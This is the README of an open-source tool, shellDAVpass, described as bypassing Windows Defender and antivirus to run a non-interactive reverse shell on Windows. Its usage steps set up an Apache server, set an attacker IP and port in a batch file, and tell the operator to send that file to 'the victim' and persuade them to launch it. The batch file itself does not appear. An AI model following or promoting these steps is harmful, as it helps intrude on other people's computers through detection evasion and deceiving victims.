# shellDAVpass
shellDAVpass application is the Open-Source project, the main idea of which is to bypass the defender and AntiVirus detections to conduct a non interactive reverse shell to execute the Windows commands

Usage example:
--------------
```
1. Start your HTTP server. For APACHE inder Debian (Ubuntu/Kali):
  systemctl start apache2.service 
2. The default port is 80. You are free to change it by editing /etc/apache2/ports.conf
  Listen 80
3. cd /var/www/html
4. git clone https://github.com/IvanGlinkin/shellDAVpass.git
5. cd shellDAVpass
6. nano shellDAVpass.bat
7. Change the IP-address and Port
  SET IPADDRESS=10.211.55.11
  SET PORT=80
8. Save the changings (by pressing CTRL+O and Enter. To exit, press CTRL+X)
9. !!! Send the shellDAVpass.bat to the victim and courage him/her to launch the file !!!
10. Launch the command prompt
  bash bash shellDAVpass.sh
11. Enter your commands
```
An original article:
--------------------
[https://www.ivanglinkin.com/sheeldavpass-non-interactive-reverse-shell-to-bypass-the-defender-and-antivirus-detections/](https://www.ivanglinkin.com/sheeldavpass-non-interactive-reverse-shell-to-bypass-the-defender-and-antivirus-detections/)

Video example:
--------------
![](https://www.ivanglinkin.com/wp-content/uploads/2021/12/AutoSUID_Video.gif)

Screenshots:
------------
![](https://www.ivanglinkin.com/wp-content/uploads/2021/11/AutoSUID.png)
